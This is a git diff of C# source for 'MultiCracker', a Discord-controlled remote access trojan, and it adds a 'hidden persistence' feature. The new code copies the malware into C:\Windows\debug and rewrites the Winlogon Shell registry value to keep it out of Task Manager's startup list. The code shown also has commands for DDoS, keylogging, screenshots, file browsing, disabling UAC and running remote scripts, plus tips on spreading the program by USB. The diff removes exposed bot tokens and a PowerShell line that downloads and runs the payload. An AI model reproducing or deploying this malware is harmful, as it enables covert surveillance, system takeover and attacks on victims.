@@ -38,6 +38,7 @@ using Microsoft.VisualBasic.ApplicationServices;
 using NAudio.Gui;
 using static System.Net.WebRequestMethods;
 using System.Security.Policy;
+using System.Collections;
 
 
 namespace MultiCracker
@@ -84,6 +85,8 @@ namespace MultiCracker
         // DONE: Make screenshot working for entire screen when only client is only using one screen.
         // DONE: Not being able to restart RAT if its channel is deleted.
         // DONE: Add command for sending all variables to the C2.
+        // DONE: Better hiding of process and persistence. (Adding to system startup: HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\WinLogon and edit Shell: explorer.exe, "<path-to-.exe-file>")
+        // Better name for stub.
         // ----------------------------------------
 
 
@@ -92,10 +95,8 @@ namespace MultiCracker
         // Go through all of them and change them to your liking.
         // ----------------------------------------
 
-        // --- KEEP IN MIND YOU NEED TO COMPILE TO ONE FILE!! (For special) --- //
-        bool SpecialPersistent = true; // If true, the bot will install persistence on the target machine. (This is a special version of persistence that is harder to detect for some computers.)
-        // --- KEEP IN MIND YOU NEED TO COMPILE TO ONE FILE!! (For special) --- //
-        bool NormalPersistent = false; // If true, the bot will install persistence on the target machine.
+        bool HiddenPersistence = true; // If true, the bot will install persistence using explorer.exe's registry start-key.
+        bool NormalPersistent = false; // If true, the bot will install persistence using normal registry startup.
         bool UAConStart = true; // If true, the bot will ask for elevation to admin on start.
         bool AutoCrack = true; // If true, the bot will automatically start cracking if it finds a hash with the auto-crack feature.
         bool AutoRAT = true; // If true, the RAT will start on the target machine at launch.
@@ -106,36 +107,39 @@ namespace MultiCracker
         string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
 
         // Communication
-        //string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
-        string BOT_TOKEN = "MTE4NDUwMDgwMzE2ODM3ODkwMA.G5OUXt.zGqLK-1Sm_fDJUyQhhxLK6HEYFr3u4kUecOMCQ";
-        //private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
-        private static string ratPrimaryToken = "MTE5Njg3NjIzMjk4NjQ2ODQ5Mw.GMcowN.BKhzAJuo4TYQUkPwRmHXCxHi33_W3ag63DeI4Y";
+        string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
+        private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
         private static string ratAlternativeToken = "<BOT TOKEN (IS NOT USED IN BELOW 2.2.0)>"; // Secondary token for the RAT. (Not used in 2.2.0)
-        
-        string registryName = "WindowsSecurity"; // Name of the registry key. (Special and normal)
-        // Persistence settings (Normal)
-        string dropPath = "C:\\Windows\\debug\\multi"; // Path to drop the file/create folder multi.
-        string fileName = "multiCracker.exe"; // Name of the .exe file to drop.
-        // Persistence settings (Special)
-        string fileNameSpecial = "WindowsSecurity.exe"; // Name of the .log file to drop with special persistence.
+
+        // Persistence settings
+        string registryName = "MultiCracker"; // Name of the registry key. (Only NormalPersistent)
+        string fileName = "MultiCracker"; // Name of the .exe file to drop. (Only NormalPersistent)
+        string dropPath = "C:\\Windows\\debug\\multi"; // Path to drop the file/create folder multi. (Used by both)
 
         // ----------------------------------------
         // Now you are done with the settings.
         //
+        // OPTIONAL: If you want to not name the project "MultiCracker" you can change the name of the project, guide below:
+        // * Right click on the "MultiCracker" top item in the Solution Explorer hierarchy.
+        // * Click on "Properties" in bottom of choices.
+        // * Go to "Application" tab.
+        // * Inside of "General" part of the tab, change the "Assembly name" to your liking. Default: "$(MSBuildProjectName)" if you were to regret the change...
+        // ----------------------------------------
         // 1. Compile and run the program, by pressing CTRL + B.
         // 2. Navigate to the bin folder where you will see the MultiCracker.exe System.IO.File. (At Your-Directory\Multi-Cracker\MultiCracker\bin\Debug\net6.0-windows\MultiCracker.exe)
         // 3. Test the program by running it. (Double click the .exe file)
         // 4. If you want to hide the window, go back to the code and change the DebugMode variable to false. And go to step 1.
-        // 5. If everything works as expected, you can now start to distribute the program to your other computers. (I would recommend to upload the program and its .dll files to a file hosting service like Mega.)
+        // 5. If everything works as expected, you can now start to distribute the program to your other computers. (I would recommend to upload the program and its needed dependencies files to a file hosting service like Mega.)
         // And then when you want to use the program, you can just download it and run it. (such as with a bad USB attack).
         // ----------------------------------------
 
         // ----------------------------------------
         // ChangeLog for current version:
         // ----------------------------------------
-        // - File management for RAT.
-        // - Better functionality for RAT despawn/spawning.
-        // - Added a way to send all variables to the C2.
+        // - Removed Special Persistence, was stupid because you needed to compile to one-file. (More detected, plus gigantic file size)
+        // - Added Hidden Persistence, it uses the explorer.exe startup registry key to start itself. (Can not be seen in taskmgr auto-start apps)
+        // - Added a command to RAT: !info, it sends the general info of the target machine to the C2.
+        // - Better documentation for better persistence understanding.
         // ----------------------------------------
 
 
@@ -147,13 +151,13 @@ namespace MultiCracker
 
         bool EmergencySTOP = false;
         string hash;
-        
+
         // Warning level
         int currentWarningLevel = 0;
         int currentWarningLevelRAT = 0;
 
         // Version
-        string currentVersion = "2.4.0";
+        string currentVersion = "2.5.0";
 
         // Force start/end
         int forceEnd = int.MaxValue; // As high as possible (default)
@@ -286,6 +290,45 @@ namespace MultiCracker
                 }
             }
         }
+
+
+        /// ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ ///
+        /// ↓↓ Could be used in later projects ↓↓ ///
+        /// ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ ///
+
+        static void ChangeAssemblyName(string newName)
+        {
+            // Get a reference to the current assembly
+            Assembly assembly = Assembly.GetExecutingAssembly();
+
+            // Get the assembly name object
+            AssemblyName assemblyName = assembly.GetName();
+
+            // Change the name property
+            assemblyName.Name = newName;
+        }
+        void RenameExecutableFile()
+        {
+            string newFileName;
+            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
+            string oldFilePath = Path.Combine(currentDirectory, "MultiCracker.exe");
+            newFileName = fileName + ".exe";
+            string newFilePath = Path.Combine(currentDirectory, newFileName);
+
+            if (System.IO.File.Exists(oldFilePath))
+            {
+                // Rename the file
+                System.IO.File.Move(oldFilePath, newFilePath);
+            }
+            else
+            {
+                MessageBox.Show("Executable file not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        /// ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ ///
+        /// ↑↑ Could be used in later projects ↑↑ ///
+        /// ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ /// 
 
 
         // Discord
@@ -421,8 +464,8 @@ namespace MultiCracker
                     messagesPersistence.Add("**!install** - Installs persistence.\r\n");
                     messagesPersistence.Add("**!uninstall** - Uninstalls persistence.\r\n");
                     messagesPersistence.Add("**!disableUAC** - Disables UAC.\r\n");
-                    messagesPersistence.Add("**!specialInstall** - Installs special persistence\r\n");
-                    messagesPersistence.Add("**!specialUninstall** - Uninstall special persistence\r\n");
+                    messagesPersistence.Add("**!hiddenInstall** - Installs hidden persistence. (Can't be seen through taskmgr auto-start apps)\r\n");
+                    messagesPersistence.Add("**!hiddenUninstall** - Uninstalls hidden persistence.\r\n");
                     messagesDDoS.Add("\r\n**-------------- DDoS --------------**\r\n");
                     messagesDDoS.Add("**!ddos <ip> <port> <time>** - Starts a DDoS attack on the target.\r\n");
                     messagesDDoS.Add("**!stopddos** - Stops all DDoS attacks.\r\n");
@@ -937,7 +980,7 @@ namespace MultiCracker
                     string[] arguments = argument.Split(" ");
                     string type = arguments[0];
                     string url = arguments[1];
-                    
+
                     // Update the bot
                     await message.Channel.SendMessageAsync($"Executing **{type}** script from link: **{url}**");
 
@@ -987,7 +1030,7 @@ namespace MultiCracker
                 else if (trimmedContent == "!variables")
                 {
                     string variables = "**All Variables:**\r\n" +
-                        $"bool **SpecialPersistent = {SpecialPersistent}**\r\n" +
+                        $"bool **HiddenPersistence = {HiddenPersistence}**\r\n" +
                         $"bool **NormalPersistent = {NormalPersistent}**\r\n" +
                         $"bool **UAConStart = {UAConStart}**\r\n" +
                         $"bool **AutoCrack = {AutoCrack}**\r\n" +
@@ -1001,7 +1044,6 @@ namespace MultiCracker
                         $"string **registryName = {registryName}**\r\n" +
                         $"string **dropPath = {dropPath}**\r\n" +
                         $"string **fileName = {fileName}**\r\n" +
-                        $"string **fileNameSpecial = {fileNameSpecial}**\r\n" +
                         $"\r\n**OTHER**\r\n" +
                         $"bool **FoundCorrectPass = {FoundCorrectPass}**\r\n" +
                         $"string **elsesPassword = {elsesPassword}**\r\n" +
@@ -1053,11 +1095,11 @@ namespace MultiCracker
                         // Send it as file instead
                         string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "variables.txt");
                         System.IO.File.WriteAllText(fullPath, variables);
-                        
+
                         // Send the file (NOT AS NORMAL TEXT)
                         await message.Channel.SendFileAsync(fullPath);
                         Log(new LogMessage(LogSeverity.Info, "Message", $"Sent variables file to C2."));
-                        
+
                         // Remove log
                         System.IO.File.Delete(fullPath);
 
@@ -1166,8 +1208,8 @@ namespace MultiCracker
                             // Log
                             Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending forcesSS: {ex.Message}"));
                         }
-                        
-                        
+
+
 
                         // Send Discord message (Created auto-target with {splitingAmounts} splits)
                         await message.Channel.SendMessageAsync($"Created auto-target with **{splitingAmounts}** splits.");
@@ -1213,13 +1255,14 @@ namespace MultiCracker
                         message.Channel.SendMessageAsync("Please elevate to admin first. (Tip: **!elevate**)");
                     }
                 }
-                else if (trimmedContent == "!specialInstall")
+                else if (trimmedContent == "!hiddenInstall")
                 {
-                    InstallSpecialPersistence();
+                    // Call the function
+                    InstallHiddenPersistence();
                 }
-                else if (trimmedContent == "!specialUninstall")
+                else if (trimmedContent == "!hiddenUninstall")
                 {
-                    UninstallSpecialPersistence();
+                    UninstallHiddenPersistence();
                 }
                 // DDoS
                 else if (trimmedContent.StartsWith("!ddos"))
@@ -1360,7 +1403,7 @@ namespace MultiCracker
                 Log(new LogMessage(LogSeverity.Info, "Message", "Received empty or whitespace-only message."));
             }
         }
-        
+
         private async Task CreateBotLogsChannel()
         {
             // Create new channel "bot-<computername>" in category "BOT_CATEGORY"
@@ -1434,9 +1477,9 @@ namespace MultiCracker
                         {
                             InstallPersistence();
                         }
-                        else if (SpecialPersistent)
+                        else if (HiddenPersistence)
                         {
-                            InstallSpecialPersistence();
+                            InstallHiddenPersistence();
                         }
                         else
                         {
@@ -1506,7 +1549,7 @@ namespace MultiCracker
             {
                 // Log
                 await LogRAT(new LogMessage(LogSeverity.Error, "RAT", $"Error: Primary token is not valid."));
-                
+
                 // Check if secondary token is valid
                 if (ratAlternativeToken == null)
                 {
@@ -1609,7 +1652,7 @@ namespace MultiCracker
                                 {
                                     properties.CategoryId = category.Id;
                                 });
-                                
+
                                 await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created ratted-{computerName} channel."));
 
                                 // Start heartbeat timer in a new thread
@@ -1828,7 +1871,7 @@ namespace MultiCracker
                 // Access their own channel
                 var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                 var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"ratted-{computer}");
-                
+
                 // Safety check if there is any messages in the channel
                 if (channel != null)
                 {
@@ -1841,7 +1884,7 @@ namespace MultiCracker
                         // Get the latest 3 messages
                         var messages = await channel.GetMessagesAsync(3).FlattenAsync();
                         // Check time difference between now and then
-                    
+
                         timeDifference = (DateTime.UtcNow - lastMessage.Timestamp.UtcDateTime).TotalSeconds;
                         LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Time difference: {timeDifference} seconds"));
                         LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Timestamp: {lastMessage.Timestamp}"));
@@ -1970,7 +2013,7 @@ namespace MultiCracker
                             // Get all directories and files in the currentPath
                             string[] allDirectories = Directory.GetDirectories(currentPath);
                             string[] allFiles = Directory.GetFiles(currentPath);
-                            
+
                             // Send discord message
                             await message.Channel.SendMessageAsync($"**Directories:**\r\n" + string.Join("\r\n", allDirectories) + "\r\n**Files:**\r\n" + string.Join("\r\n", allFiles));
                         }
@@ -1978,7 +2021,7 @@ namespace MultiCracker
                         {
                             // Make a array of all directories in "currentPath" that starts with "argument"
                             string[] directories = Directory.GetDirectories(currentPath, argument + "*", SearchOption.TopDirectoryOnly);
-                            
+
                             // If length of directories is 0
                             if (directories.Length == 0)
                             {
@@ -2063,7 +2106,7 @@ namespace MultiCracker
                             LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Changed directory to: {currentPath}"));
                         }
 
-                        
+
 
                     }
                     else if (trimmedContent.StartsWith("!download"))
@@ -2233,6 +2276,7 @@ namespace MultiCracker
                     Help_Message += "\r\n**------------------- BASIC -------------------**\r\n";
                     Help_Message += $"**!help** - Shows this message.\r\n";
                     Help_Message += $"**!kys** - Kills the RAT.\r\n";
+                    Help_Message += $"**!info** - Shows information about the client's computer.\r\n";
                     // SURVEILLANCE
                     Help_Message += "\r\n**------------------- SURVENILLANCE -------------------**\r\n";
                     Help_Message += $"**!screenshot** - Takes a screenshot of the screen.\r\n";
@@ -2274,6 +2318,16 @@ namespace MultiCracker
 
                     // Stop the bot (Variable)
                     RATRunning = false;
+                }
+                else if (trimmedContent == "!info")
+                {
+                    string output = "**INFORMATION:**\r\n";
+
+                    // Get information about the computer
+                    string info = GetInformation();
+
+                    // Send discord message
+                    await message.Channel.SendMessageAsync(output + info);
                 }
                 // SURVEILLANCE
                 else if (trimmedContent == "!screenshot")
@@ -2728,10 +2782,10 @@ namespace MultiCracker
                     fileManagerActive = true;
                 }
                 // RECOVERY
-                
+
                 // OTHER
                 else if (trimmedContent == "!log")
-                {   
+                {
                     try
                     {
                         string log = txtOutput.Text;
@@ -2774,7 +2828,7 @@ namespace MultiCracker
             string computerNameRaw = Environment.MachineName;
             string computerName = computerNameRaw.ToLower();
             var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
-            
+
             while (command != "exit")
             {
                 var lastMessage = (await channel.GetMessagesAsync(1).FlattenAsync()).FirstOrDefault();
@@ -2788,7 +2842,7 @@ namespace MultiCracker
 
                     // Execute command
                     await Task.Run(() => ExecuteCommand(command));
-                    
+
                     // Log
                     Log(new LogMessage(LogSeverity.Info, "Interactive Command", $"Executing command: {command}"));
 
@@ -2904,7 +2958,7 @@ namespace MultiCracker
 
         private void StopKeylogger()
         {
-            
+
         }
 
         private string DumpKeylogger()
@@ -2935,7 +2989,7 @@ namespace MultiCracker
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
         public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
-        
+
         private string FormatKeylog(string original)
         {
             // Log
@@ -3149,14 +3203,6 @@ namespace MultiCracker
         // Updater/Executer
         public async Task<string> ExecuteScript(string type, string url)
         {
-            // Update bot from url (powershell). Script could look like this:
-            /// -------------------------------------- ///
-            ///
-            /// cd C:\Windows\security; if (!(Test-Path .\database)) { New-Item -ItemType Directory -Path .\database }; cd .\database; foreach ($i in ('AForge.dll', 'AForge.Video.DirectShow.dll', 'AForge.Video.dll', 'Discord.Net.Commands.dll', 'Discord.Net.Core.dll', 'Discord.Net.Interactions.dll', 'Discord.Net.Rest.dll', 'Discord.Net.Webhook.dll', 'Discord.Net.WebSocket.dll', 'Microsoft.Extensions.DependencyInjection.Abstractions.dll', 'MultiCracker.deps.json', 'MultiCracker.dll', 'MultiCracker.exe', 'MultiCracker.pdb', 'MultiCracker.runtimeconfig.json', 'Newtonsoft.Json.dll', 'System.Interactive.Async.dll', 'System.Linq.Async.dll', 'System.Reactive.dll')) { curl -Uri "https://raw.githubusercontent.com/USERNAME/REPONAME/main/PAYLOADS/MULTICRACKER/2.2.0/$i" -OutFile $i }; C:\windows\security\database\multicracker.exe
-            /// 
-            /// -------------------------------------- ///
-
-
             // Get content from url
             string content = GetContent(url);
 
@@ -3176,7 +3222,7 @@ namespace MultiCracker
                     {
                         Directory.CreateDirectory(dropPath);
                     }
-            
+
                     // Download the content to a .vbs file
                     string vbsPath = Path.Combine(dropPath, "script.vbs");
                     System.IO.File.WriteAllText(vbsPath, content);
@@ -3328,9 +3374,9 @@ namespace MultiCracker
 
             // Find the channel
             var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
-            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}"); 
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
 
-            if ( channel == null )
+            if (channel == null)
             {
                 // Log
                 Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
@@ -3651,20 +3697,21 @@ namespace MultiCracker
             }
         }
 
-        async void InstallSpecialPersistence()
+
+        // Hidden Persistence
+        async void InstallHiddenPersistence()
         {
-            // Make a copy of current executable and put it in "C:\windows\security\database" folder as "WindowsSecurity.log"
-            // Find the name of computer
+            // Find the name of the computer
             string computerNameRaw = Environment.MachineName;
             string computerName = computerNameRaw.ToLower();
-           
+
             // Find the channel
             var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
-            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+            var channel = guild?.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
 
             if (channel == null)
             {
-                // Log
+                // Log and return if the channel is not found
                 Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
                 return;
             }
@@ -3672,218 +3719,350 @@ namespace MultiCracker
             // Check if admin
             bool isAdmin = IsAdministrator();
 
-            // if not admin
+            // If not admin
             if (!isAdmin)
             {
-                // Log
+                // Log and inform the user if not an admin
                 Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin..."));
-                channel.SendMessageAsync("Error: Not admin... (Tip use **!elevate** to ask for elevation.)");
+                await channel.SendMessageAsync("Error: Not admin... (Tip: use **!elevate** to ask for elevation.)");
+                return;
+            }
+
+            // Proceed with persistence installation for admin users
+
+            // Set important variables
+            string exePath = Application.ExecutablePath;
+            string exeName = Path.GetFileName(exePath);
+
+            // Set the target directory
+            string targetDirectory = dropPath;
+
+            // Check so that the target directory exists
+            if (!Directory.Exists(targetDirectory))
+            {
+                Directory.CreateDirectory(targetDirectory);
+            }
+
+            // Get all the .dll and .pdb files in the current directory
+            string[] dllFiles = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll");
+            string[] pdbFiles = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.pdb");
+            string[] jsonFiles = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.json");
+
+            // Force targetDirectory to end with \ 
+            if (!targetDirectory.EndsWith(@"\")) targetDirectory += @"\";
+
+            // Check if current directory is already the target directory
+            if (Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory) == Path.GetFullPath(targetDirectory))
+            {
+                // Log and inform if the current directory is already the target directory
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Current directory is already the target directory."));
+                await channel.SendMessageAsync($"Seems that program started in target directory. ({targetDirectory})");
             }
             else
             {
                 // Log
-                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing special persistence..."));
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copying files to {targetDirectory}..."));
+                await channel.SendMessageAsync($"Copying files to {targetDirectory}...");
 
-                // Set important variables
-                string exePath = Application.ExecutablePath;
-                string exeName = Path.GetFileName(exePath);
-                string newExePath = Path.Combine(@"C:\windows\security\database", $"{fileNameSpecial}");
-                string targetDirectory = @"C:\windows\security\database";
-
-                if (!Directory.Exists(targetDirectory))
+                // Copy all the .dll and .pdb files to the target directory
+                foreach (string dllFile in dllFiles)
                 {
-                    Directory.CreateDirectory(targetDirectory);
-                }
-
-                // Check if the executable is in droppoint
-                if (System.IO.File.Exists(newExePath))
-                {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is already installed."));
-                    channel.SendMessageAsync($"Exe persistence is already installed. (Path to EXE: {newExePath})");
-                }
-                else
-                {
-                    // Copy the executable to drop point
                     try
                     {
-                        System.IO.File.Copy(exePath, newExePath);
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {exePath} to {newExePath}"));
+                        System.IO.File.Copy(dllFile, Path.Combine(targetDirectory, Path.GetFileName(dllFile)), true); // Overwrite if exists
+                        // Log and inform about the successful copy
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {dllFile} to {targetDirectory}"));
                     }
                     catch (Exception ex)
                     {
-                        // Log
-                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {exePath} to {newExePath}: {ex.Message}"));
-                        channel.SendMessageAsync($"Error copying {exePath} to {newExePath}: {ex.Message}");
+                        // Log and inform about the error if copying fails
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {dllFile} to {targetDirectory}: {ex.Message}"));
+                        await channel.SendMessageAsync($"Error copying {dllFile} to {targetDirectory}: {ex.Message}");
                     }
                 }
-
-                // Check for registry key
-                RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                string[] subKeys = keyCheck.GetValueNames();
-                bool regeditPersistenceInstalled = false;
-                foreach (string subKey in subKeys)
+                foreach (string pdbFile in pdbFiles)
                 {
-                    if (subKey == registryName)
-                    {
-                        regeditPersistenceInstalled = true;
-                    }
-                }
-                if (regeditPersistenceInstalled)
-                {
-                       // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is already installed."));
-                    channel.SendMessageAsync($"Regedit persistence is already installed. (Keyname: {registryName})");
-                }
-                else
-                {
-                    // Create registry key
                     try
                     {
-                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        key.SetValue(registryName, newExePath);
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
-                        channel.SendMessageAsync("Installed persistence.");
+                        System.IO.File.Copy(pdbFile, Path.Combine(targetDirectory, Path.GetFileName(pdbFile)), true); // Overwrite if exists
+                        // Log and inform about the successful copy
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {pdbFile} to {targetDirectory}"));
                     }
                     catch (Exception ex)
                     {
-                        // Log
-                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
-                        channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
+                        // Log and inform about the error if copying fails
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {pdbFile} to {targetDirectory}: {ex.Message}"));
+                        await channel.SendMessageAsync($"Error copying {pdbFile} to {targetDirectory}: {ex.Message}");
+                    }
+                }
+                foreach (string jsonFile in jsonFiles)
+                {
+                    try
+                    {
+                        System.IO.File.Copy(jsonFile, Path.Combine(targetDirectory, Path.GetFileName(jsonFile)), true); // Overwrite if exists
+                        // Log and inform about the successful copy
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {jsonFile} to {targetDirectory}"));
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log and inform about the error if copying fails
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {jsonFile} to {targetDirectory}: {ex.Message}"));
+                        await channel.SendMessageAsync($"Error copying {jsonFile} to {targetDirectory}: {ex.Message}");
                     }
                 }
 
-                // Check if both are installed
-                if (regeditPersistenceInstalled && System.IO.File.Exists(newExePath))
+                // Check if all files are copied to the target directory
+                if (dllFiles.Length == Directory.GetFiles(targetDirectory, "*.dll").Length && pdbFiles.Length == Directory.GetFiles(targetDirectory, "*.pdb").Length && jsonFiles.Length == Directory.GetFiles(targetDirectory, "*.json").Length)
                 {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
-                    channel.SendMessageAsync("Persistence is installed.");
+                    // Log and inform about the successful copy
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"All files copied to {targetDirectory}"));
+                    await channel.SendMessageAsync($"All files copied to {targetDirectory}");
                 }
                 else
                 {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
-                    channel.SendMessageAsync("Persistence is not installed.");
+                    // Log and inform about the error if not all files are copied
+                    Log(new LogMessage(LogSeverity.Error, "Persistence", $"Not all files copied to {targetDirectory}"));
+                    await channel.SendMessageAsync($"Not all files copied to {targetDirectory}");
                 }
-                
+            }
+
+            // Copy the executable to the target directory
+            try
+            {
+                // Check if executable is current executable
+                if (Path.GetFullPath(exePath) != Path.GetFullPath(Path.Combine(targetDirectory, exeName)))
+                {
+                    System.IO.File.Copy(exePath, Path.Combine(targetDirectory, exeName), true);
+                    // Log and inform about the successful copy
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {exePath} to {targetDirectory}"));
+                    await channel.SendMessageAsync($"Copied {exePath} to {targetDirectory}");
+                }
+                else
+                {
+                    // Log and inform if the executable is already in the target directory
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Executable is already in the target directory."));
+                    await channel.SendMessageAsync($"Executable is already in the target directory.");
+                }
+            }
+            catch (Exception ex)
+            {
+                // Log and inform about the error if copying fails
+                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {exePath} to {targetDirectory}: {ex.Message}"));
+                await channel.SendMessageAsync($"Error copying {exePath} to {targetDirectory}: {ex.Message}");
+            }
+
+            // Register the executable to run at startup
+            try
+            {
+                RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
+                if (key != null)
+                {
+                    string KeyValue = "explorer.exe, \"" + Path.Combine(targetDirectory, exeName) + "\"";
+                    key.SetValue("Shell", KeyValue);
+                    // Log and inform about the successful registry modification
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed registry part. ({KeyValue})"));
+                    await channel.SendMessageAsync($"Installed registry part. ({KeyValue})");
+                }
+                else
+                {
+                    // Log and inform if unable to access the registry key
+                    Log(new LogMessage(LogSeverity.Error, "Persistence", $"Unable to access registry key."));
+                    await channel.SendMessageAsync($"Unable to access registry key.");
+                }
+            }
+            catch (Exception ex)
+            {
+                string KeyValue = Path.Combine(targetDirectory, exeName);
+                // Log and inform about the error if registry modification fails
+                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}\r\n{KeyValue}"));
+                await channel.SendMessageAsync($"Error adding registry key: {ex.Message}\r\n{KeyValue}");
             }
         }
-        async void UninstallSpecialPersistence()
+
+        async void UninstallHiddenPersistence()
         {
-            // Remove the registry key and also delete the executable in "C:\windows\security\database" folder
-            // Find the name of computer
+            // Remove the registry key and also delete the executable, its .dll and .pdb files in "C:\windows\security\database" folder
+            // Find the name of the computer
             string computerNameRaw = Environment.MachineName;
             string computerName = computerNameRaw.ToLower();
 
             // Find the channel
             var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
             var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
-   
-            if (channel == null)
-            {
-                // Log
-                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
-                return;
-            }
 
-            // Check if admin
-            bool isAdmin = IsAdministrator();
-            if (!isAdmin)
+            if (channel != null)
             {
-                // Log
-                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin..."));
-                channel.SendMessageAsync("Error: Not admin... (Tip use **!elevate** to ask for elevation.)");
-                return;
+                // Check if admin
+                bool isAdmin = IsAdministrator();
+                if (!isAdmin)
+                {
+                    // Log and inform the user if not an admin
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin..."));
+                    await channel.SendMessageAsync("Error: Not admin... (Tip: use **!elevate** to ask for elevation)");
+                    return;
+                }
+
+                // Proceed with persistence uninstallation for admin users
+
+                // Get the executable name from the .exe file in the current directory
+                string exeName = Path.GetFileName(Application.ExecutablePath);
+
+                // Create a new file called "uninstall.vbs" in the temp directory
+                string uninstallVbsPath = Path.Combine(Path.GetTempPath(), "uninstall.vbs");
+                string uninstallVbsContent = "";
+                uninstallVbsContent += $"Dim objFSO, objShell\r\n";
+                uninstallVbsContent += $"Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\n";
+                uninstallVbsContent += $"Set objShell = CreateObject(\"WScript.Shell\")\r\n";
+                uninstallVbsContent += $"On Error Resume Next\r\n";
+                uninstallVbsContent += $"objShell.Run \"taskkill /im {exeName} /f\", 0, True\r\n";
+
+                // Set the target directory
+                string targetDirectory = dropPath;
+
+                // Check if the target directory exists
+                if (Directory.Exists(targetDirectory))
+                {
+                    // Delete the executable in the target directory
+                    string exePath = Path.Combine(targetDirectory, exeName);
+
+                    // Delete all the .dll and .pdb files in the target directory
+                    string[] dllFiles = Directory.GetFiles(targetDirectory, "*.dll");
+                    string[] pdbFiles = Directory.GetFiles(targetDirectory, "*.pdb");
+                    string[] jsonFiles = Directory.GetFiles(targetDirectory, "*.json");
+                    foreach (string dllFile in dllFiles)
+                    {
+                        try
+                        {
+                            // Add code to vbs file to delete the .dll file
+                            uninstallVbsContent += $"objFSO.DeleteFile \"{dllFile}\"\r\n";
+                        }
+                        catch (Exception ex)
+                        {
